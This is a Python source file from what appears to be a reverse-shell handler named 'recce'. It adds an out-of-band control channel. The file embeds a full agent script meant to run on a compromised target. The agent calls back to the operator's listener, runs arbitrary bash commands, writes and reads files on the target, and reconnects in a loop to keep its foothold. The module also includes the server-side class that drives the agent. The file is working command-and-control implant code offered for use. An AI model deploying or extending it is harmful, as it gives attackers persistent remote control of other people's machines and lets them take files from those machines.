"""Out-of-band control channel for a caught shell.

The problem: quickrun / download / upload / enum / portfwd / PTY-upgrade
all inject shell commands into the SAME PTY that streams operator I/O.
Even with heavy regex filtering, echoes and captured payloads leaked
into the operator's terminal — every filter we added was one step
behind a new command shape.

The fix: a SEPARATE TCP connection dedicated to control frames.
Operator PTY bytes and OOB control frames never share the same wire.

## Wire format

Little agent script (`AGENT_SCRIPT` below) runs on the target next to
the shell and connects back to the recce listener with an `oob`
handshake. Once bound to its session, frames flow both ways:

    [4-byte big-endian length][1-byte type][payload]

Types:
  * 0x01 EXEC       payload = bash command string (utf-8)
  * 0x02 EXEC_RESULT payload = [4-byte exit code][stdout][stderr]
  * 0x03 FILE_WRITE payload = [4-byte path len][path utf-8][file bytes]
  * 0x04 FILE_ACK   payload = [4-byte bytes written] or [0xff error msg]
  * 0x05 FILE_READ  payload = [4-byte path len][path utf-8]
  * 0x06 FILE_DATA  payload = [file bytes] (empty on read failure)
  * 0x07 PING       payload = timestamp bytes (agent echoes back as PONG)
  * 0x08 PONG       payload = same

Frames are strictly request/response — the recce side never sends two
concurrent EXECs on the same channel. That keeps the protocol tiny.

## Adoption

The listener already peeks at `RECCE1 <token> <mode>\n` handshakes.
`<mode>` was previously `pty` or absent (raw); we now also recognize
`oob`. An OOB connection is matched to its parent session by token
and stored as `Session.oob_channel`; if no matching session exists
the connection is dropped.

## Fallback

When a session has NO OOB channel (raw reverse shell without the
new stager), `Session.run_and_capture` and `_push_file` continue to
use the PTY-based implementation. Nothing regresses.
"""
from __future__ import annotations

import asyncio
import struct
import time

# Frame type constants — stable wire values; the agent hardcodes them.
EXEC = 0x01
EXEC_RESULT = 0x02
FILE_WRITE = 0x03
FILE_ACK = 0x04
FILE_READ = 0x05
FILE_DATA = 0x06
PING = 0x07
PONG = 0x08

_HEADER = struct.Struct("!IB")   # 4-byte length, 1-byte type


# --- agent script that runs on the target -------------------------------------
# Deployed by the stager alongside the reverse shell. Pure stdlib, works on
# any Python 3.6+; no third-party deps. The `RECCE1 <token> oob\n` header
# is what the listener uses to bind this connection to its session.

AGENT_SCRIPT = r'''#!/usr/bin/env python3
"""recce OOB agent — separate control channel to keep PTY bytes clean."""
import socket, struct, subprocess, sys, os, time, threading

H, P, T = sys.argv[1], int(sys.argv[2]), sys.argv[3]

EXEC = 0x01
EXEC_RESULT = 0x02
FILE_WRITE = 0x03
FILE_ACK = 0x04
FILE_READ = 0x05
FILE_DATA = 0x06
PING = 0x07
PONG = 0x08

def connect():
    for _ in range(30):
        try:
            s = socket.create_connection((H, P), timeout=10)
            s.sendall(b"RECCE1 " + T.encode() + b" oob\n")
            return s
        except Exception:
            time.sleep(1)
    sys.exit(1)

def rx(s, n):
    buf = b""
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf

_lk = threading.Lock()

def send_frame(s, t, payload=b""):
    with _lk:
        try:
            s.sendall(struct.pack("!IB", len(payload), t) + payload)
        except Exception:
            pass

def handle_exec(s, payload):
    cmd = payload.decode("utf-8", "replace")
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=180)
        rc = r.returncode
        out = r.stdout
        err = r.stderr
    except subprocess.TimeoutExpired:
        rc, out, err = 124, b"", b"[recce-oob] command timed out\n"
    except Exception as e:
        rc, out, err = 127, b"", (str(e) + "\n").encode("utf-8", "replace")
    body = struct.pack("!I", rc & 0xffffffff) + out + err
    send_frame(s, EXEC_RESULT, body)

def handle_file_write(s, payload):
    plen = struct.unpack("!I", payload[:4])[0]
    path = payload[4:4+plen].decode("utf-8", "replace")
    data = payload[4+plen:]
    try:
        d = os.path.dirname(path)
        if d:
            os.makedirs(d, exist_ok=True)
        with open(path, "wb") as f:
            f.write(data)
        send_frame(s, FILE_ACK, struct.pack("!I", len(data)))
    except Exception as e:
        send_frame(s, FILE_ACK, b"\xff" + str(e).encode("utf-8", "replace")[:200])

def handle_file_read(s, payload):
    plen = struct.unpack("!I", payload[:4])[0]
    path = payload[4:4+plen].decode("utf-8", "replace")
    try:
        with open(path, "rb") as f:
            data = f.read()
        send_frame(s, FILE_DATA, data)
    except Exception:
        send_frame(s, FILE_DATA, b"")

def dispatch(s, t, payload):
    if t == EXEC:
        threading.Thread(target=handle_exec, args=(s, payload), daemon=True).start()
    elif t == FILE_WRITE:
        threading.Thread(target=handle_file_write, args=(s, payload), daemon=True).start()
    elif t == FILE_READ:
        threading.Thread(target=handle_file_read, args=(s, payload), daemon=True).start()
    elif t == PING:
        send_frame(s, PONG, payload)

def main():
    while True:
        s = connect()
        s.settimeout(None)
        try:
            while True:
                hdr = rx(s, 5)
                if hdr is None:
                    break
                length = struct.unpack("!I", hdr[:4])[0]
                t = hdr[4]
                payload = rx(s, length) if length else b""
                if payload is None:
                    break
                dispatch(s, t, payload)
        except Exception:
            pass
        try:
            s.close()
        except Exception:
            pass
        # reconnect loop — mirrors the PTY stager's self-healing behaviour
        time.sleep(2)

if __name__ == "__main__":
    main()
'''


# --- server-side channel ------------------------------------------------------

class OobChannel:
    """Server-side handle to an OOB agent. One live TCP connection.

    Requests are serialised through `_lock` so two callers can't interleave
    frames (the wire is strictly request/response). Every request has a
    reasonable timeout so a hung agent doesn't wedge the operator forever;
    on timeout the channel closes and the fallback (PTY) kicks in on the
    next call."""

    def __init__(self, reader: asyncio.StreamReader,
                  writer: asyncio.StreamWriter,
                  peer_addr: tuple[str, int] | None = None) -> None:
        self._r = reader
        self._w = writer
        self._lock = asyncio.Lock()
        self.peer_addr = peer_addr
        self.opened = time.time()
        self.last_used = time.time()
        self.alive = True

    async def _send(self, t: int, payload: bytes = b"") -> None:
        self._w.write(_HEADER.pack(len(payload), t) + payload)
        await self._w.drain()

    async def _recv(self) -> tuple[int, bytes]:
        hdr = await self._r.readexactly(_HEADER.size)
        length, t = _HEADER.unpack(hdr)
        payload = await self._r.readexactly(length) if length else b""
        return t, payload

    async def exec(self, cmd: bytes, timeout: float = 60.0) -> tuple[int, bytes]:
        """Run a bash command via the agent. Returns (exit_code, output).
        Raises TimeoutError on hang; caller falls back to PTY."""
        async with self._lock:
            self.last_used = time.time()
            await self._send(EXEC, cmd)
            try:
                t, payload = await asyncio.wait_for(self._recv(), timeout)
            except (asyncio.IncompleteReadError, ConnectionError, OSError) as e:
                self.alive = False
                raise OSError(f"OOB channel closed: {e}") from e
            if t != EXEC_RESULT:
                raise OSError(f"OOB channel returned wrong frame type: 0x{t:02x}")
            rc = struct.unpack("!I", payload[:4])[0]
            return rc, payload[4:]

    async def write_file(self, path: str, data: bytes,
                          timeout: float = 60.0) -> int:
        """Write bytes to a file on the target. Returns count on success,
        raises OSError with the agent's error message on failure."""
        async with self._lock:
            self.last_used = time.time()
            path_bytes = path.encode("utf-8")
            payload = struct.pack("!I", len(path_bytes)) + path_bytes + data
            await self._send(FILE_WRITE, payload)
            try:
                t, ack = await asyncio.wait_for(self._recv(), timeout)
            except (asyncio.IncompleteReadError, ConnectionError, OSError) as e:
                self.alive = False
                raise OSError(f"OOB channel closed: {e}") from e
            if t != FILE_ACK:
                raise OSError(f"OOB channel returned wrong frame type: 0x{t:02x}")
            if ack[:1] == b"\xff":
                raise OSError("target file write failed: "
                              + ack[1:].decode("utf-8", "replace"))
            return struct.unpack("!I", ack[:4])[0]

    async def read_file(self, path: str, timeout: float = 60.0) -> bytes:
        async with self._lock:
            self.last_used = time.time()
            path_bytes = path.encode("utf-8")
            await self._send(FILE_READ, struct.pack("!I", len(path_bytes)) + path_bytes)
            try:
                t, payload = await asyncio.wait_for(self._recv(), timeout)
            except (asyncio.IncompleteReadError, ConnectionError, OSError) as e:
                self.alive = False
                raise OSError(f"OOB channel closed: {e}") from e
            if t != FILE_DATA:
                raise OSError(f"OOB channel returned wrong frame type: 0x{t:02x}")
            return payload

    async def close(self) -> None:
        self.alive = False
        try:
            self._w.close()
            await self._w.wait_closed()
        except Exception:  # noqa: BLE001 — best-effort teardown
            pass
